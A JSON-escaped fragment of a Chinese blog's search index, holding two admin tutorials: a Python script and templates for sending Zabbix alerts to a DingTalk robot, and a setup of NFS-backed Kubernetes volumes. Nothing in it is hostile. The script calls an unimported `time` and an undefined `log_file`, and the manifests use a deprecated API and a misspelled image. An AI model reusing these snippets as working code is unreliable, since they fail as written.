\u0026#34;isAtAll\u0026#34;: False } } headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} r=requests.post(url=webhook,data=json.dumps(json_text),headers=headers).json() code = r[\u0026#34;errcode\u0026#34;] time=time.strftime(\u0026#34;%Y-%m-%d %H:%M:%S\u0026#34;, time.localtime()) if code == 0: log(time + \u0026#34;:消息发送成功 返回码:\u0026#34; + str(code) + \u0026#34;\\n\u0026#34;) else: log(time + \u0026#34;:消息发送失败 返回码:\u0026#34; + str(code) + \u0026#34;\\n\u0026#34;) exit(3) if __name__ == \u0026#39;__main__\u0026#39;: user = sys.argv[1] #用户 subject = sys.argv[2] #标题 text = sys.argv[3] #消息 msg(text,user) 我们把上面的文件内容放到 /usr/lib/zabbix/alertscripts 目录下，名字就叫做 dingding.py ，只能是这个目录，因为这是 zabbix 缺省外挂脚本文件的目录。\n从上面代码里我们可以看到，实际是发送了一个 markdown 的文本，那么自然，各种markdown的语法就可以用起来了，仔细看一下钉钉markdown参数的详解：\n可以根据自己需求来修改。\n接下来我们配置Zabbix的告警配置\n创建新的告警媒介：媒介类型选择脚本，提前将上方的脚本放置于/usr/lib/zabbix/alertscripts中并在脚本名称处填写你命名的文件名。 添加告警参数：这里用到了3个参数，第一个是{ALERT.SENDTO}告警对象，第二个是{ALERT.SUBJECT}告警对象，第三个是{ALERT.MESSAGE}告警正文，按照填写即可。\nALERT.SENDTO}\n#对应Python脚本中的，user=sys.argv1。\n{ALERT.SUBJECT}\n#发送的信息的标题\n{ALERT.MESSAGE}\n#对应Python脚本中的，text=sys.argv3。\n增加Message type：一般增加3个就足够了，发现问题、问题恢复、问题更新，详细的设置在下方说明。\n这里就是关键了：\n发现问题的模板：\n![告警平台信息](http://www.rendoumi.com/fire.png)\r\u0026gt; * ##### 告警主机: {HOSTNAME1}\r\u0026gt; * ##### 告警时间: {EVENT.DATE} {EVENT.TIME}\r\u0026gt; * ##### 告警等级: {TRIGGER.SEVERITY}\r\u0026gt; * ##### 告警信息: {TRIGGER.NAME}\r\u0026gt; * ##### 告警项目: {TRIGGER.KEY1}\r\u0026gt; * ##### 问题详情: {ITEM.NAME}:{ITEM.VALUE}\r\u0026gt; * ##### 当前状态: {TRIGGER.STATUS}:{ITEM.VALUE1}\r\u0026gt; * ##### 事件ID: {EVENT.ID} Problem recovery(问题恢复)的模板：\n![告警平台信息](http://www.rendoumi.com/recover.png)\r\u0026gt; * #### 警告解除：{EVENT.RECOVERY.DATE} {EVENT.RECOVERY.TIME}\r\u0026gt; * ##### 告警持续时长: {EVENT.DURATION}\r\u0026gt; * ##### 告警主机: {HOST.NAME}\r\u0026gt; * ##### 告警信息: {EVENT.NAME}\r\u0026gt; * ##### 告警等级: {EVENT.SEVERITY}\r\u0026gt; * ##### 事件ID: {EVENT.ID}\r\u0026gt; * ##### {TRIGGER.URL} 有这两个就够了\n创建动作（点击左边菜单的配置\u0026mdash;\u0026gt;动作）\n添加告警条件\n添加 触发器示警度 大于等于 警告\n操作，选择发送给Admin组，或者其他组。\n在操作细节里，我们发送告警到Admin组，然后方式选dingding，这样就跟报警媒介联系起来了。\n这样一轮轮的更新以后，就可以使用了。注意要研究Markdown的语法。另外提前准备好图片。\n我们就得到一个跟阿里云告警一摸一样的东西了，说实话，好看，没有鸟用。\n","permalink":"https://rendoumi.com/posts/20221130-zabbix_dingding/","summary":"\u003cp\u003ezabbix 是很熟悉的东西，但是实际上博主已经跳过了这个东西，直接蹦到 Prometheus 去了\u003c/p\u003e\n\u003cp\u003e但是，存在即合理，当下公司用的是这个，那么用就用吧，zabbix发到钉钉告警。\u003c/p\u003e\n\u003cp\u003e那么我们也研究一下如何发到钉钉告警，而且好看一些\u003c/p\u003e\n\u003cp\u003e原理：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e原理就是用 post 向钉钉机器人的 webhook 地址提交 Markdown 的 json 信息\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e首先我们要建立个钉钉群，然后在群中添加一个群机器人，这里就会有两个选择，一个是这个机器人只接受特定的词语，二是向机器人发送消息的机器的ip是固定的。\u003c/p\u003e\n\u003cp\u003e阿里云建议的是关键词：\u003cstrong\u003e云监控、云服务、监控、Monitor、ECS、报警\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20221130195533865\" loading=\"lazy\" src=\"/posts/20221130-zabbix_dingding/image-20221130195533865.png\"\u003e\u003c/p\u003e\n\u003cp\u003e当然，这里更加建议IP，IP是死的，报警里带关键词意味着发送内容被部分固定了。\u003c/p\u003e\n\u003cp\u003e如上，我们会得到一个钉钉机器人的Webhook地址：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://oapi.dingtalk.com/robot/send?access_token\u003cspan class=\"o\"\u003e=\u003c/span\u003exxxxxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后我们要准备一个发送的脚本，python很合适\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"ch\"\u003e#!/usr/bin/env python\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#coding:utf-8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#zabbix钉钉报警\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"nn\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"nn\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"nn\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e\u003cspan class=\"nn\"\u003edatetime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#说明：这里改为自己创建的机器人的webhook\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ewebhook\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=xxxxxx\u0026#34;\u003c/span\u003e     \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eisfile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/tmp/dingding.log\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"kc\"\u003eFalse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elog_file\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;a+\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elog_file\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;w+\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ejson_text\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;msgtype\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;markdown\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;markdown\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         \u003cspan class=\"s2\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;zabbix monitor\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         \u003cspan class=\"s2\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003etext\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;at\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         \u003cspan class=\"s2\"\u003e\u0026#34;atMobiles\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             \u003cspan class=\"n\"\u003euser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e             \u003cspan class=\"p\"\u003e],\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         \u003cspan class=\"s2\"\u003e\u0026#34;isAtAll\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eheaders\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;application/json\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ewebhook\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejson_text\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;errcode\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estrftime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%Y-%m-\u003c/span\u003e\u003cspan class=\"si\"\u003e%d\u003c/span\u003e\u003cspan class=\"s2\"\u003e %H:%M:%S\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003elocaltime\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;:消息发送成功 返回码:\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etime\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;:消息发送失败 返回码:\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"vm\"\u003e__name__\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;__main__\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"c1\"\u003e#用户\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003esubject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"c1\"\u003e#标题\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003etext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"c1\"\u003e#消息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们把上面的文件内容放到 /usr/lib/zabbix/alertscripts 目录下，名字就叫做 dingding.py ，只能是这个目录，因为这是 zabbix 缺省外挂脚本文件的目录。\u003c/p\u003e","title":"Zabbix下发往钉钉告警"},{"content":"用NFS来做kubernetes的持久化卷虽然不是最佳实践，但存在即合理。在现在的公司就是这么用的，记录一下，可用但不是最佳。\n一、搭建NFS服务端和所有工作节点安装客户端 #NFS服务端 (centos7) yum install nfs-utils rpcbind -y mkdir -p /data/nfs/{download,bakup,www} echo \u0026#34;/data/nfs 10.10.0.0/16(rw,all_squash,insecure,sync)\u0026#34; \u0026gt;\u0026gt; /etc/exports exportfs -r systemctl enable rpcbind nfs-server systemctl restart rpcbind nfs-server showmount -e localhost #客户端根本不装也可以，客户端不需要启动任何nfs服务 #只是为了使用showmount工具来验证 #NFS客户端（CentOS，所有WorkNode节点都需要执行） yum install -y nfs-utils #NFS客户端（Ubuntu，所有WorkNode节点都需要执行） apt install -y nfs-common NFS 服务端的参数如下：\nrw 能读能写 insecure NFS通过1024以上的端口发送 root_squash root会被变成noboby，其他人不变 no_root_squash root身份保持不变，其他人不变。（不能用这个，容易被黑） all_squash 不论登入NFS的使用者身份为何，他的身份都会被压缩成为匿名使用者，通常也就是nobody sync 数据直接落盘，性能略损。 async 数据先落内存，然后落盘，性能略升。 综上，保险的参数就是\n/data/nfs 10.10.0.0/16(rw,insecure,all_squash,sync) 注意：修改了/etc/exports后，并不需要重启nfs服务，只要用exportfs重新扫描一次/etc/exports，并且重新加载即可\nexports -rv 二、POD内直接使用 由于nfs是内核自带的东西，所以最简单的使用方法就是直接在pod内使用\napiVersion: v1 kind: Pod metadata: name: test labels: app.kubernetes.io/name: alpine spec: containers: - name: alpine image: alpine:latest command: - touch - /data/test volumeMounts: - name: nfs-volume mountPath: /data volumes: - name: nfs-volume nfs: server: 10.10.247.38 path: /data readOnly: no 这个pod是一次性运行的，运行完后就可以看到nfs中多了个test文件\n三、用PV和PVC使用 先建立PV，注意策略是Retain，不会丢数据。如果是Recycle会清洗数据\napiVersion: v1 kind: PersistentVolume metadata: name: nfs-pv-pvname spec: accessModes: - ReadWriteOnce - ReadOnlyMany - ReadWriteMany capacity: storage: 10Gi storageClassName: \u0026#34;\u0026#34; persistentVolumeReclaimPolicy: Retain volumeMode: Filesystem nfs: server: 10.10.247.38 path: /data readOnly: no 然后建立 PVC\napiVersion: v1\rkind: PersistentVolumeClaim\rmetadata:\rname: nfs-pvc-pvcname\rspec:\raccessModes:\r- ReadWriteMany\rresources:\rrequests:\rstorage: 1Gi 建一个Deployment，用一下\napiVersion: extensions/v1beta1 kind: Deployment metadata: name: nfs-pvc spec: replicas: 1 template: metadata: labels: app: nfs-pvc spec: containers: - name: nginx image: alphine/nginx:latest imagePullPolicy: IfNotPresent ports: - containerPort: 80 name: web #使用volume volumeMounts: - name: www subPath: nginx-pvc #远程子路径 mountPath: /usr/share/nginx/html volumes: - name: www persistentVolumeClaim: claimName: nfs-pvc-pvcname 注意：\nStorage 10Gi 1Gi 这都是骗鬼玩儿呢，根本不起任何作用！！！ ","permalink":"https://rendoumi.com/posts/20221124-k8s_nfs/","summary":"\u003cp\u003e用NFS来做kubernetes的持久化卷虽然不是最佳实践，但存在即合理。在现在的公司就是这么用的，记录一下，可用但不是最佳。\u003c/p\u003e\n\u003ch4 id=\"一搭建nfs服务端和所有工作节点安装客户端\"\u003e一、搭建NFS服务端和所有工作节点安装客户端\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#NFS服务端 (centos7)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install nfs-utils rpcbind -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /data/nfs/\u003cspan class=\"o\"\u003e{\u003c/span\u003edownload,bakup,www\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/data/nfs 10.10.0.0/16(rw,all_squash,insecure,sync)\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /etc/exports\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexportfs -r\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl 